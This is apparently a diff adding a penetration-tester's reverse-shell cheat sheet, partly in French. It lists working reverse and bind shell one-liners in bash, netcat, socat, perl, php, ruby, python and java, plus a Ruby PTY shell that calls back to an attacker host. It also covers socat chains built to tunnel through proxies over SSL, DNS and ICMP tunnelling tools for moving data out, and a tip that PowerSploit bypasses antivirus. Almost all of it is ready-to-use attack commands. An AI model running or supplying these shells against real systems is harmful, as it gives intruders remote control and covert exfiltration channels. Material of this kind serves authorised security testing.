@@ -1,0 +1,203 @@
+# reverse-shells
+
+# find an outbound port
+http://portquiz.net/
+http://letmeoutofyour.net/
+
+# file transfer over DNS
+https://github.com/breenmachine/dnsftp
+http://breenmachine.blogspot.ca/2014/09/transfer-file-over-dns-in-windows-with.html # DNS tunnel with powershell
+
+# file transfer with uuencode
+http://www.terrencemiao.com/Webmail/msg00022.html
+
+# if on windows and has powershell, use PowerSploit (bonus: will bypass AV)
+http://www.pentestgeek.com/2013/07/19/invoke-shellcode/
+
+# sources
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+http://www.hsc-news.com/archives/2011/000082.html
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+http://bernardodamele.blogspot.fr/2011/09/reverse-shells-one-liners.html
+http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
+fuzzdb/attack-payloads/os-cmd-execution/reverse-shell-one-liners.doc.txt
+
+## bind shell with hping and uid 0
+hping -I eth0 -p 22 --listen s3cr3t | /bin/sh
+moi: echo s3cr3t | nc -v victim 22
+
+## le vpn du pauvre
+sshuttle https://github.com/apenwarr/sshuttle
+
+## icmp
+ptunnel (written in c & needs libpcap on client)
+soicmp (written in python & needs pcapy+libpcap on client)
+icmpshell (wirtten in c & no deps, bind shell only)
+icmpsh (client only windows)
+tcpovericmp (https://github.com/Maksadbek/tcpovericmp)
+
+## sctp
+python-pty-shells
+
+## udp
+python-pty-shells, udptunnel, pwnat, chownat
+
+## dns
+dnsxss
+dnscat2, dnscat (included in http://www.skullsecurity.org/wiki/index.php/Nbtool)
+iodine
+heyoka
+dns2tcp
+
+## ipv6
+??
+
+## tcp
+# bind shell
+# netcat without -e
+sh -c "mkfifo /tmp/.f;nc -lp 4444 </tmp/.f|sh >/tmp/.f 2>&1" #beware not all nc support this -lp 1234 syntax
+
+# bind on already used port
+https://github.com/sghctoma/multipass
+
+## reverse shell
+# netcat without -e (hsc)
+mkfifo /tmp/.f (ou mknod fifo p)
+nc 10.6.6.6 8888 </tmp/.f |sh  >/tmp/.f 2>&1
+
+# netcat without -e (pm)
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f
+
+# telnet (hsc)
+moi: nc -l -p 8888 et nc -l -p 9999
+telnet 10.6.6.6 8888 | /bin/sh | telnet 10.6.6.6 9999
+
+# socat
+moi: socat tcp-l:8888,fork,reuseaddr -
+clt: socat tcp-connect:10.6.6.6:8888 exec:'bash -i',pty,stderr,setsid,sigint,sane #hsc
+
+# socat pty -> proxy CONNECT but surviving the proxy dropping the CONNECT connexion
+moi term1: socat TCP-LISTEN:8888,forever,interval=1,fork file:`tty`,echo=0,raw
+moi term2: mkfifo f; while :; do nc -vnlp 443 < f | nc -vn 127.0.0.1 8888 > f; done
+clt: socat -d exec:'bash -i',pty,stderr,setsid,sigint,sane proxy:192.168.122.1:127.0.0.1:443,proxyport=3128,forever,interval=1,fork
+
+# socat pty -> ssl -> proxy CONNECT 
+moi: socat openssl-listen:443,reuseaddr,fork,cert=cert.pem,key=key.pem,verify=0 file:`tty`,echo=0,raw
+clt term1: socat tcp-l:8443,fork,reuseaddr proxy:$PROXY_IP:$MYBOX_IP:443,proxyport=$PROXY_PORT
+clt term2: while :; do socat exec:'bash -i',pty,stderr,setsid,sigint,sane openssl:127.0.0.1:8443,verify=0; done
+
+# socat pty -> http client -> b64 encryption -> dmz proxy -> http server
+me: server.py
+clt: socat exec:'path/to/client.py proxy.dmz 3128 jmpbox.com 443' exec:'bash -i',pty,stderr,setsid,sigint,sane,echo=0
+
+# bash pty > http client -> b64 encryption -> dmz proxy -> http server
+me: server.py
+clt: ./client.py 192.168.122.1 3128 10.6.6.6 443 < f | bash -i &>f
+
+# nc-like with pty
+https://github.com/emptymonkey/revsh
+
+# lsv hsc Dec 2014
+clt:
+require 'pty'
+require 'socket'
+
+def doconnect()
+  begin
+    s = TCPSocket.new 'pentest.attaquant.fr', 4444
+    return s
+  rescue
+    sleep(1)
+    retry
+  end
+end
+
+PTY.spawn("/bin/bash") {|r, w, pid|
+  socket = doconnect
+  loop do
+    r_s = select([r, socket]);
+    output = (r_s[0][0] == socket) ? w : socket
+    begin
+      out = r_s[0][0].read_nonblock(1024)
+      output.write(out)
+    rescue EOFError
+      socket = doconnect
+    end
+  end
+}
+
+# bash
+echo salut > /dev/tcp/1.2.3.4/80 # test if disabled
+bash 0</dev/tcp/1.2.3.4/8888 1>&0 2>&0 #hsc
+bash -i >& /dev/tcp/1.2.3.4/1234 0>&1 #pm
+
+# perl
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' #pm
+
+perl -e "use IO::Socket; socket(SOCK, PF_INET, SOCK_STREAM,\
+           getprotobyname('tcp'));\
+          if(connect(SOCK, sockaddr_in(8888,inet_aton('10.6.6.6'))))\
+          {open(STDIN, '>&SOCK');open(STDERR, '>&SOCK');\
+          open(STDOUT, '>&SOCK');exec('/bin/sh');}" #hsc
+
+# php
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' #pm
+
+$ php -r '$socket = fsockopen("10.6.6.6",8888,$errno,$errstr,10);\
+  $descriptorspec = array(0 => array("pipe", "r"), 1=> array("pipe", "w"),\
+  2 => array("pipe", "r"));\
+  $process = proc_open("/bin/sh", $descriptorspec, $pipes);\
+  while(1){ $tocheck = array($pipes[1],$pipes[2],$socket);\
+  $int = stream_select($tocheck,$a =NULL,$b = NULL,0);\
+  if (in_array($pipes[1],$tocheck)) {$input = fread($pipes[1],4999);\
+  fwrite($socket,$input);} if (in_array($pipes[2],$tocheck)) \
+  {$input = fread($pipes[2],4999);fwrite($socket,$input);} \
+  if (in_array($socket,$tocheck)) \
+  { $input = fread($socket,4999);fwrite($pipes[0],$input);}  }' #hsc
+
+# ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' #pm
+
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.6.6.6","8888");\
+  while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' #hsc
+
+# python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' #pm
+
+python -c "import sys, socket, os; \
+  handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM); \
+  handler.connect((str('10.6.6.6'), 8888)); os.dup2(handler.fileno(),\
+  sys.stdin.fileno()); os.dup2(handler.fileno(),sys.stdout.fileno());\
+  os.system('/bin/bash')" #hsc
+
+# powershell (hsc)
+tl;dr
+
+# metasploit (hsc)
+
+# java (pm)
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+# curl (hsc)
+
+# wget (hsc)
+
+# xterm (pm)
+moi: Xnest :1 ; xhost +targetip
+xterm -display 10.0.0.1:1
+
+# awk
+
+# nodejs
+https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
+
+# javascript/rundll32 (windows)
+https://gist.github.com/subTee/f1603fa5c15d5f8825c0 (https://twitter.com/subTee/status/676581725414166529)
+
+# get a tty
+* using expect
+http://pentestmonkey.net/blog/post-exploitation-without-a-tty
+* using python
+python -c 'import pty; pty.spawn("/bin/sh")'
